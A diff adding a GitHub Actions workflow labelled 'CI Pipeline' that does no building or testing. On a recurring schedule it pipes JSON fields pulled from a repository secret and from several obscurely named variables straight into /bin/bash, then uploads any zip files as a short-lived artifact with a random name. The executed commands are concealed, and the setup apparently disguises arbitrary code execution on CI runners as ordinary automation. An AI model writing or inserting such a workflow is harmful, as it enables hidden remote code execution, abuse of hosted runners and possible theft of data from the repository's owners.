@@ -1,0 +1,36 @@
+name: CI Pipeline
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '53 3,9,15,21 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  RUNNER_DEBUG: 0
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  invoke:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Run pipeline
+        env:
+          nc0229: ${{ secrets.nc0229 }}
+        run: |
+          printf '%s' "$nc0229" | jq -r .nh61 | /bin/bash
+          printf '%s' "$emm41" | jq -r .yiui4489 | /bin/bash
+          printf '%s' "$fdi562" | jq -r .u770 | /bin/bash
+          echo $bz56189 | jq -r .ifp8 | /bin/bash
+          printf '%s' "$dfou39124" | jq -r .weufc6112 | /bin/bash
+          printf '%s' "$bp9" | jq -r .dt7726 | /bin/bash
+
+      - name: Upload archive
+        uses: actions/upload-artifact@v4
+        with:
+          name: gIkcgcce
+          path: "*.zip"
+          retention-days: 1
